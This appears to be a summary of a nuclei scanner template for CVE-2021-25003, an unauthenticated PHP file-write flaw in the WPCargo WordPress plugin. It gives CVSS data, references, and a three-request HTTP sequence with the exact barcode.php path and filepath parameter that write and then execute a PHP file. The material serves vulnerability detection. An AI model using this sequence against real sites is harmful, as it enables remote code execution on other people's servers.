---
cve_id: CVE-2021-25003
template_path: nuclei-templates/http/cves/2021/CVE-2021-25003.yaml
affected_product: WordPress WPCargo Track & Trace plugin
severity: critical
authentication: none
external_callback: false
affected_versions: <6.9.0
preconditions: []
poc_classification: rce
---

## Vulnerability
WordPress WPCargo Track & Trace plugin before 6.9.0 contains an arbitrary PHP file write flaw in `includes/barcode.php`. An unauthenticated attacker can supply a `filepath` parameter to write malicious PHP anywhere on the web server, leading to full remote code execution. Successful exploitation yields arbitrary code execution, malware deployment, sensitive data access, data modification, and complete system control.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). CWE-434, CWE-94.

## PoC / Detection
Classification: rce

The template verifies the RCE via a three-request raw HTTP sequence using a random filename (`{{randstr}}`):
- GET `/wp-content/plugins/wpcargo/includes/{{randstr}}.php` (expects status_code != 200 to confirm clean state).
- GET `/wp-content/plugins/wpcargo/includes/barcode.php?text=...&sizefactor=.090909090909&size=1&filepath={{randstr}}.php` (exploits the filepath handler to write attacker-controlled PHP).
- POST `/wp-content/plugins/wpcargo/includes/{{randstr}}.php?1=var_dump` with form data `2={{md5(999999999)}}` (executes the written file).

Matchers confirm: status_1 != 200, status_2 == 200, status_3 == 200, body_3 contains the MD5 hash and the string 'PNG'.

## References
- https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
- https://wordpress.org/plugins/wpcargo/
- https://nvd.nist.gov/vuln/detail/CVE-2021-25003
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/WhooAmii/POC_to_review
